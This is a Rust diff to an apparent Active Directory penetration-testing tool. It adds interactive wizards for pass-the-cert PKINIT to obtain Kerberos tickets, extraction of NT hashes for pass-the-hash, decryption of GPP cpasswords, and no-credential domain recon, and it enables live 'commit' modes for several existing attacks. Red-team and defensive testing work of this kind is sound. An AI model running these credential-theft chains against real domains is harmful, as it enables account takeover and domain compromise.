@@ -89,6 +89,12 @@ enum Action {
     AttackDns,
     EnumSccm,
     EnumScom,
+    /// F1a — kerb pkinit (pass-the-cert → TGT).
+    KerbPkinit,
+    /// F1c — kerb u2u-nt (PKINIT → NT hash extract).
+    KerbU2uNt,
+    /// F6 — creds gpp-decrypt (MS14-025 cpassword → plaintext).
+    GppDecrypt,
     ShowRoadmap,
     WipeSession,
     Exit,
@@ -166,6 +172,18 @@ const CATEGORIES: &[(&str, &[(&str, Action)])] = &[
             (
                 "Silver — forge a service ticket (service key)",
                 Action::Silver,
+            ),
+            (
+                "Kerb PKINIT — cert / .pfx → TGT (pass-the-cert)",
+                Action::KerbPkinit,
+            ),
+            (
+                "Kerb U2U-NT — PKINIT then extract NT hash (PtH-ready)",
+                Action::KerbU2uNt,
+            ),
+            (
+                "GPP decrypt — MS14-025 cpassword → plaintext",
+                Action::GppDecrypt,
             ),
         ],
     ),
@@ -294,6 +312,29 @@ fn banner(sess: &session::Session, verbose_auto_forced: bool) {
 }
 
 pub async fn run(use_old: bool, no_save: bool, verbose_auto_forced: bool) -> Result<()> {
+    // WS-UX-FRONTDOOR (1.5.1): no-cred first touch. A cold newcomer must be able to run
+    // black-box recon WITHOUT being forced through the credential wizard — that is the
+    // 1.5.0 headline surface. Offer the goal up front (only on a cold start; a saved
+    // session or `--old` goes straight to the authenticated flow as before).
+    if !use_old && !session::exists() {
+        let goal = prompt_select(
+            "What do you want to do?",
+            &[
+                "Recon — black-box discovery, NO credentials (DNS → DC fingerprint → anon SMB)",
+                "Authenticated — enter credentials, then scan / chain attacks",
+                "Pass-the-Cert — I have a .key.pem (+ optional .crt) → TGT / NT hash",
+            ],
+            0,
+        )
+        .context("goal cancelled")?;
+        if goal == 0 {
+            return recon_wizard().await;
+        }
+        if goal == 2 {
+            return ptc_wizard().await;
+        }
+    }
+
     let reuse = use_old
         || (session::exists()
             && prompt_confirm(
@@ -392,6 +433,219 @@ pub async fn run(use_old: bool, no_save: bool, verbose_auto_forced: bool) -> Res
         }
     }
 
+    Ok(())
+}
+
+/// WS-UX-FRONTDOOR (1.5.1): the no-credential recon path. Collects a domain + one
+/// authorized target (DC IP / CIDR / hostname) + optional anon-SMB depth, then routes to
+/// the black-box discovery flow. No user/password is ever requested or sent.
+async fn recon_wizard() -> Result<()> {
+    crate::ui::header_err("ADhammer recon — no credentials");
+    crate::ui::note(
+        "Black-box first touch: DNS SRV discovery → per-DC fingerprint → anonymous SMB posture.",
+    );
+    crate::ui::note(
+        "Nothing authenticated is sent. Controls: Enter=default  y=yes  n=no  Ctrl+C=cancel",
+    );
+
+    let domain: String = Input::new()
+        .with_prompt("Target AD domain (DNS, e.g. corp.local)")
+        .with_initial_text("corp.local")
+        .interact_text()
+        .context("domain prompt")?;
+    let target: String = Input::new()
+        .with_prompt(
+            "Authorized target you may probe — a DC IP, CIDR, or hostname (e.g. 10.0.0.10)",
+        )
+        .interact_text()
+        .context("target prompt")?;
+    let dns: String = Input::new()
+        .with_prompt("DNS server for SRV lookups (blank = system resolver)")
+        .allow_empty(true)
+        .interact_text()
+        .context("dns prompt")?;
+    let deep = prompt_confirm(
+        "Also run the anonymous SMB posture on discovered DCs? (null-session share/session enum)",
+        true,
+    )
+    .unwrap_or(true);
+
+    let mut args = crate::blackbox::RunArgs {
+        domains: vec![domain.trim().to_string()],
+        ranges: Vec::new(),
+        hosts: Vec::new(),
+        hostnames: Vec::new(),
+        excludes: Vec::new(),
+        dns_servers: Vec::new(),
+        web: false,
+        web_timeout: 5,
+        deep,
+        json: false,
+    };
+    let t = target.trim();
+    if t.contains('/') {
+        args.ranges.push(t.to_string()); // CIDR — blackbox validates it
+    } else if let Ok(ip) = t.parse::<std::net::IpAddr>() {
+        args.hosts.push(ip);
+    } else {
+        args.hostnames.push(t.to_string());
+    }
+    let dnst = dns.trim();
+    if !dnst.is_empty() {
+        if let Ok(ip) = dnst.parse::<std::net::IpAddr>() {
+            args.dns_servers.push(ip);
+        } else {
+            crate::ui::warn("DNS server must be an IP — ignoring, using the system resolver");
+        }
+    }
+
+    crate::blackbox::run(args).await
+}
+
+/// WS-UX-FRONTDOOR-PTC (1.5.1): pass-the-cert wizard. Walks the operator from
+/// a `.key.pem` (+ optional `.crt`) — or a `.pfx` which we point at `openssl` —
+/// through `kerb pkinit` (F1a) → TGT ccache → optional `kerb u2u-nt` chain to
+/// pull the NT hash for PtH into `attack ptt` / `attack dcsync`.
+async fn ptc_wizard() -> Result<()> {
+    crate::ui::header_err("ADhammer pass-the-cert");
+    crate::ui::note(
+        "PKINIT chain: private key (+ optional CA-issued cert) → TGT → (optional) NT hash.",
+    );
+    crate::ui::note(
+        "Sources: `shadowcred --add` (self-signed, key-trust) OR `esc1` (CA-issued, cert-based).",
+    );
+
+    let key_path: String = Input::new()
+        .with_prompt(
+            "Private key file — PKCS#8 PEM (`.key.pem`) OR PKCS#12 bundle (`.pfx` / `.p12`)",
+        )
+        .interact_text()
+        .context("key prompt")?;
+    let key_path = key_path.trim().to_string();
+    let low = key_path.to_ascii_lowercase();
+    let is_pfx = low.ends_with(".pfx") || low.ends_with(".p12");
+
+    let (pfx_input, key_input, cert_input, pfx_password) = if is_pfx {
+        // Bundle path — cert lives inside; ask only for the bundle password.
+        let pw: String = Password::new()
+            .with_prompt("PFX/P12 password (blank = unencrypted)")
+            .allow_empty_password(true)
+            .interact()
+            .context("pfx password prompt")?;
+        (
+            Some(key_path.clone()),
+            None,
+            String::new(),
+            // Interactive input is literal by contract — bypass the `From<String>`
+            // `@file:`/`env:` expansion path (that's for CLI-flag composition, not
+            // for an operator typing at a live rpassword prompt).
+            adhammer_core::SecretString::new(pw),
+        )
+    } else {
+        let cert_path: String = Input::new()
+            .with_prompt(
+                "Certificate file (blank = self-signed key-trust PKINIT / Shadow-Credentials)",
+            )
+            .allow_empty(true)
+            .interact_text()
+            .context("cert prompt")?;
+        (
+            None,
+            Some(key_path.clone()),
+            cert_path.trim().to_string(),
+            adhammer_core::SecretString::default(),
+        )
+    };
+    let cert_path = cert_input;
+
+    let user: String = Input::new()
+        .with_prompt("Principal to authenticate as (SAM, no realm)")
+        .with_initial_text("Administrator")
+        .interact_text()
+        .context("user prompt")?;
+    let realm: String = Input::new()
+        .with_prompt("Kerberos realm (e.g. CORP.LOCAL)")
+        .interact_text()
+        .context("realm prompt")?;
+    let kdc: String = Input::new()
+        .with_prompt("KDC host or IP (host[:port])")
+        .interact_text()
+        .context("kdc prompt")?;
+    let out: String = Input::new()
+        .with_prompt("Output ccache path")
+        .with_initial_text(format!("{}.ccache", user.trim()))
+        .interact_text()
+        .context("out prompt")?;
+
+    let want_unpac = prompt_confirm(
+        "After PKINIT, also extract the NT hash from PAC_CREDENTIAL_INFO (kerb u2u-nt)?",
+        true,
+    )
+    .unwrap_or(true);
+
+    // F1a — kerb pkinit.
+    crate::attacks::kerb::pkinit(crate::attacks::kerb::PkinitArgs {
+        key: key_input.clone(),
+        cert: if cert_path.is_empty() {
+            None
+        } else {
+            Some(cert_path.clone())
+        },
+        pfx: pfx_input.clone(),
+        pfx_password: pfx_password.clone(),
+        user: user.trim().to_string(),
+        realm: realm.trim().to_string(),
+        kdc: kdc.trim().to_string(),
+        out: Some(out.clone()),
+    })
+    .await?;
+
+    if want_unpac {
+        // F1c alias uses attack unpac's PEM-oriented args. When the operator
+        // supplied a PFX, extract once more (cheap — small file) so the u2u-nt
+        // chain has the same PEM+DER pair to feed pkinit_with_cert.
+        let (u_key_path, u_cert_path) = if let Some(pfx_p) = pfx_input.as_deref() {
+            let (pem_body, cert_der) = crate::attacks::kerb::decode_pfx_bundle_for_reuse(
+                pfx_p,
+                pfx_password.expose_secret(),
+            )?;
+            let user_slug = user.trim().to_string();
+            let key_scratch = std::env::temp_dir().join(format!("adhammer-{user_slug}.key.pem"));
+            let cert_scratch = std::env::temp_dir().join(format!("adhammer-{user_slug}.crt"));
+            adhammer_core::write_secret_artifact(
+                &key_scratch,
+                adhammer_core::SecretArtifact::PrivateKey,
+                pem_body.as_bytes(),
+            )?;
+            std::fs::write(&cert_scratch, &cert_der)
+                .with_context(|| format!("write scratch cert to {}", cert_scratch.display()))?;
+            (
+                key_scratch.to_string_lossy().to_string(),
+                Some(cert_scratch.to_string_lossy().to_string()),
+            )
+        } else {
+            (
+                key_input.clone().unwrap_or_default(),
+                if cert_path.is_empty() {
+                    None
+                } else {
+                    Some(cert_path.clone())
+                },
+            )
+        };
+        crate::attacks::unpac::unpac(crate::attacks::unpac::UnpacArgs {
+            kdc: kdc.trim().to_string(),
+            realm: realm.trim().to_string(),
+            user: user.trim().to_string(),
+            key: u_key_path,
+            cert: u_cert_path,
+        })
+        .await?;
+    }
+
+    crate::ui::ok(
+        "PTC chain complete — TGT is in the ccache, PtH-ready NT hash is above (if requested).",
+    );
     Ok(())
 }
 
@@ -757,6 +1011,7 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                     user: Some(s.username.clone()),
                     password: Some(s.password.expose().clone()),
                     insecure: s.insecure,
+                    allow_plaintext_ldap: false,
                 },
                 action: actions[ai],
                 name,
@@ -764,6 +1019,7 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 zone: None,
                 forest,
                 ttl: 3600,
+                commit: live,
                 dry_run: !live,
             })
             .await
@@ -861,6 +1117,7 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                     user: Some(s.username.clone()),
                     password: Some(s.password.expose().clone()),
                     insecure: s.insecure,
+                    allow_plaintext_ldap: false,
                 },
                 action: actions[ai],
                 target,
@@ -869,6 +1126,7 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 kdc: Some(s.dc.clone()),
                 ldap389: false,
                 host: Some(s.dc.clone()),
+                commit: true,
                 dry_run: false,
             })
             .await
@@ -1047,6 +1305,7 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 port: 5985,
                 nt_hash: sess_hash(s),
                 command,
+                shell: crate::attacks::winrm_exec::ShellKind::Cmd,
             })
             .await
         }
@@ -1318,6 +1577,15 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 insecure: true,
                 template,
                 enrollee: None,
+                commit: true,
+                chain_esc1: false,
+                alt_name: None,
+                ca: None,
+                smb_host: None,
+                smb_domain: None,
+                kdc: None,
+                pkinit: false,
+                restore: false,
             })
             .await
         }
@@ -1344,6 +1612,7 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 },
                 dmsa_name,
                 target,
+                commit: true,
             })
             .await
         }
@@ -1423,6 +1692,110 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 database: (!database.trim().is_empty()).then(|| database.trim().to_string()),
                 tsv: false,
                 execute_as,
+            })
+            .await
+        }
+        Action::KerbPkinit => {
+            // F1a — collect key/cert or pfx + realm/kdc/user (session defaults).
+            let key_path: String = Input::new()
+                .with_prompt("Private key file — PKCS#8 PEM OR PKCS#12 bundle (.pfx/.p12)")
+                .interact_text()?;
+            let key_path = key_path.trim().to_string();
+            let low = key_path.to_ascii_lowercase();
+            let (pfx_input, key_input, cert_input, pfx_password) = if low.ends_with(".pfx")
+                || low.ends_with(".p12")
+            {
+                let pw: String = Password::new()
+                    .with_prompt("PFX/P12 password (blank = unencrypted)")
+                    .allow_empty_password(true)
+                    .interact()?;
+                (
+                    Some(key_path.clone()),
+                    None,
+                    None,
+                    // See note at the PtC wizard site: interactive input is a literal, not
+                    // a `@file:`/`env:` reference — bypass expansion.
+                    adhammer_core::SecretString::new(pw),
+                )
+            } else {
+                let c: String = Input::new()
+                    .with_prompt("Cert file (blank = self-signed / key-trust)")
+                    .allow_empty(true)
+                    .interact_text()?;
+                (
+                    None,
+                    Some(key_path.clone()),
+                    (!c.trim().is_empty()).then(|| c.trim().to_string()),
+                    adhammer_core::SecretString::default(),
+                )
+            };
+            let user: String = Input::new()
+                .with_prompt("Principal to authenticate as (SAM)")
+                .with_initial_text(&s.username)
+                .interact_text()?;
+            let realm: String = Input::new()
+                .with_prompt("Kerberos realm (upper-cased)")
+                .with_initial_text(s.domain.to_uppercase())
+                .interact_text()?;
+            let kdc: String = Input::new()
+                .with_prompt("KDC host or IP")
+                .with_initial_text(&s.dc)
+                .interact_text()?;
+            crate::attacks::kerb::pkinit(crate::attacks::kerb::PkinitArgs {
+                key: key_input,
+                cert: cert_input,
+                pfx: pfx_input,
+                pfx_password,
+                user: user.trim().to_string(),
+                realm: realm.trim().to_string(),
+                kdc: kdc.trim().to_string(),
+                out: None,
+            })
+            .await
+        }
+        Action::KerbU2uNt => {
+            // F1c — same shape as PKINIT (chains PAC_CREDENTIAL_INFO decrypt).
+            let key_path: String = Input::new()
+                .with_prompt("Private key file (PKCS#8 PEM — pair with .crt for cert-based)")
+                .interact_text()?;
+            let cert_path: String = Input::new()
+                .with_prompt("Cert file (blank = self-signed / key-trust)")
+                .allow_empty(true)
+                .interact_text()?;
+            let user: String = Input::new()
+                .with_prompt("Principal (SAM)")
+                .with_initial_text(&s.username)
+                .interact_text()?;
+            let realm: String = Input::new()
+                .with_prompt("Kerberos realm")
+                .with_initial_text(s.domain.to_uppercase())
+                .interact_text()?;
+            let kdc: String = Input::new()
+                .with_prompt("KDC host or IP")
+                .with_initial_text(&s.dc)
+                .interact_text()?;
+            crate::attacks::unpac::unpac(crate::attacks::unpac::UnpacArgs {
+                kdc: kdc.trim().to_string(),
+                realm: realm.trim().to_string(),
+                user: user.trim().to_string(),
+                key: key_path.trim().to_string(),
+                cert: (!cert_path.trim().is_empty()).then(|| cert_path.trim().to_string()),
+            })
+            .await
+        }
+        Action::GppDecrypt => {
+            // F6 — take the base64 cpassword; optionally an account label.
+            let cp: String = Input::new()
+                .with_prompt("cpassword (base64)")
+                .interact_text()?;
+            let acct: String = Input::new()
+                .with_prompt("Account name (blank = don't prefix)")
+                .allow_empty(true)
+                .interact_text()?;
+            crate::attacks::creds::gpp_decrypt(crate::attacks::creds::GppDecryptArgs {
+                cpassword: Some(cp.trim().to_string()),
+                file: None,
+                account: (!acct.trim().is_empty()).then(|| acct.trim().to_string()),
             })
             .await
         }
@@ -1682,6 +2055,9 @@ fn action_name(action: &Action) -> &'static str {
         Action::AttackDns => "ADIDNS write",
         Action::EnumSccm => "SCCM enumeration",
         Action::EnumScom => "SCOM enumeration",
+        Action::KerbPkinit => "Kerb PKINIT (pass-the-cert)",
+        Action::KerbU2uNt => "Kerb U2U-NT (NT hash extract)",
+        Action::GppDecrypt => "GPP decrypt",
         Action::ShowRoadmap => "Roadmap",
         Action::WipeSession => "Wipe session",
         Action::Exit => "Exit",
@@ -1705,9 +2081,14 @@ fn action_mode(action: &Action) -> &'static str {
         | Action::Unconstrained
         | Action::Dcshadow
         | Action::Zerologon => "passive / low-impact",
-        Action::Roast | Action::Spray | Action::Gmsa | Action::Laps | Action::Asktgt => {
-            "credential / validation"
-        }
+        Action::Roast
+        | Action::Spray
+        | Action::Gmsa
+        | Action::Laps
+        | Action::Asktgt
+        | Action::KerbPkinit
+        | Action::KerbU2uNt
+        | Action::GppDecrypt => "credential / validation",
         Action::Capture
         | Action::Poison
         | Action::Relay
